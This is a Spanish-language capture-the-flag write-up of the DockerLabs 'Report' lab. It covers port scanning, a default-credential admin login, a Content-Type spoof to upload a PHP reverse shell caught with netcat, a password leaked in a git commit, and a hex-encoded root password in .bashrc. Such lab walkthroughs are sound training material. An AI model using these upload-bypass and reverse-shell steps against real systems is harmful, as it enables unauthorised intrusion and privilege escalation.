---
title: Report
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-03
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-report/report_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - fuzzing web
  - rfi
  - interactive tty
  - git
  - data leaks
  - information gathering
  - web analysis
  - foothold
  - lateral movement
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/report:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.044 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/report:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///     Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/report:-$ sudo nmap  -sCV -p22,80,3306 -vvv -oN nmap2 127.17.0.2
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 58:46:38:70:8c:d8:4a:89:93:07:b3:43:17:81:59:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK3jyO8oTx3+eTtg3uEj4vQXYl0j42cuhclLt2dyyfiFLbeW94LqNiU+Y7Ew2F93cNaw4X+HEs9XE6j6if3YDn8=
|   256 25:99:39:02:52:4b:80:3f:aa:a8:9a:d4:8e:9a:eb:10 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEm9qKfzI/z7OvQrroF3oJEDlNu9yzmddiw449QxIeeR
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://realgob.dl/
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   syn-ack ttl 64 MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
|   Thread ID: 9
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, ODBCClient, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, FoundRows, SupportsLoadDataLocal, SupportsCompression, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: hs,yD&.UC/a{hu6KTGDa
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/report:-$ echo '127.17.0.2\trealgob.dl' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/dockerlabs/report:-$ whatweb realgob.dl
http://realgob.dl [200 OK] Apache[2.4.58], Bootstrap[4.5.2], Country[RESERVED][ZZ], Email[contacto@gobiernoficticio.gob], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2], JQuery, Script, Title[Gobierno Municipal]
```

---
## Web Analysis

Encuentro un servicio web con múltiples opciones y directorios disponibles.

![](assets/img/dockerlabs-writeup-report/report1_1.png)

```terminal
/home/kali/Documents/dockerlabs/report:-$ dirb http://realgob.dl
---- Scanning URL: http://realgob.dl/ ----
+ http://realgob.dl/admin.php (CODE:200|SIZE:1005)
==> DIRECTORY: http://realgob.dl/api/
==> DIRECTORY: http://realgob.dl/assets/
==> DIRECTORY: http://realgob.dl/database/
==> DIRECTORY: http://realgob.dl/images/
==> DIRECTORY: http://realgob.dl/includes/
+ http://realgob.dl/index.php (CODE:200|SIZE:5048)
+ http://realgob.dl/info.php (CODE:200|SIZE:76297)
+ http://realgob.dl/LICENSE (CODE:200|SIZE:0)
==> DIRECTORY: http://realgob.dl/logs/
==> DIRECTORY: http://realgob.dl/pages/
+ http://realgob.dl/server-status (CODE:200|SIZE:7309)
==> DIRECTORY: http://realgob.dl/uploads/
```

El la página `admin.php` presenta un formulario de inicio de sesión. Utilizo credenciales básicas `admin:admin123`, logrando acceder con éxito.

![](assets/img/dockerlabs-writeup-report/report1_2.png)

Una vez dentro, soy redirigido a la página `cargas.php`, que permite subir archivos directamente al servidor.

![](assets/img/dockerlabs-writeup-report/report1_3.png)

---
## Foothold

Intento subir una reverse shell utilizando el script [pentestmonkey/php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php). Sin embargo, al hacerlo, la página responde con el mensaje, "Tipo de archivo no permitido."

![](assets/img/dockerlabs-writeup-report/report1_4.png)
![](assets/img/dockerlabs-writeup-report/report1_5.png)

Para analizar la restricción, intercepto la solicitud utilizando Burp Suite. En la solicitud HTTP, identifico el encabezado `Content-Type`, cuyo valor predeterminado es `application/x-php`. Modifico este valor a `image/jpeg` y reenvío la solicitud al servidor.

![](assets/img/dockerlabs-writeup-report/report1_6.png)

Como resultado, la carga del archivo es exitosa, y el servidor confirma con el mensaje, "Archivo cargado exitosamente."

![](assets/img/dockerlabs-writeup-report/report1_7.png)

A continuación, me pongo a la escucha en el puerto previamente definido y accedo a la página `uploads.php` para ejecutar la reverse shell cargada.

```terminal
/home/kali/Documents/dockerlabs/report:-$ nc -nvlp 1234
	listening on [any] 1234 ...
```

![](assets/img/dockerlabs-writeup-report/report1_8.png)


```terminal
	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 52798

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

```terminal
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@kali:/var/www/mybb$ ^Z
zsh: suspended  nc -lnvp 1234

/home/kali/Documents/dockerlabs/report:-$ stty raw -echo;fg
[1]  + continued  nc -lnvp 1234
                               reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@kali:/var/www/html$ export TERM=xterm
www-data@kali:/var/www/html$ export SHELL=bash
www-data@kali:/var/www/html$ stty rows 42 columns 86

www-data@kali:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Una vez estabilizada la sesión, navego por los directorios y encuentro un proyecto en desarrollo en la ruta `/var/www/html/desarrollo`. Para revisar su historial de cambios, configuro el entorno de Git.

```terminal
www-data@kali:/var/www/html/desarrollo$ export HOME=/var/www/html/uploads
www-data@kali:/var/www/html/desarrollo$ git config --global --add safe.directory /var/www/html/desarrollo
```

Al inspeccionar los commits, identifico un commit sospechoso, "Acceso a Remote Managment".

```terminal
www-data@kali:/var/www/html/desarrollo$ git log
```

![](assets/img/dockerlabs-writeup-report/report2_1.png)

```terminal
www-data@kali:/var/www/html/desarrollo$ git show 0baff
```

![](assets/img/dockerlabs-writeup-report/report2_2.png)

En los cambios del commit, encuentro credenciales explícitas del usuario `adm`, `adm:9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX`.

```terminal
www-data@kali:/var/www/html/desarrollo$ su adm
Password: 9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX

adm@kali:~$ id
uid=1001(adm) gid=100(users) groups=100(users)
```

---
## Privilege Escalation

Inspecciono su archivo `.bashrc` en busca de información relevante o configuraciones sospechosas.

```terminal
adm@kali:~$ cat .bashrc
```

![](assets/img/dockerlabs-writeup-report/report3_1.png)

En el archivo, encuentro una cadena hexadecial definida como `MY_PASS`. Convierto esta cadena para revelar su contenido y el resultado es la contraseña del usuario `root`.

```terminal
/home/kali/Documents/dockerlabs/report:-$ echo ’64 6f 63 6b 65 72 6c 61 62 73 34 75’ | xxd -r -p
dockerlabs4u
```

```terminal
adm@kali:~$ su root
Password: dockerlabs4u

root@kali:/home/adm# id
uid=0(root) gid=0(root) groups=0(root)
```
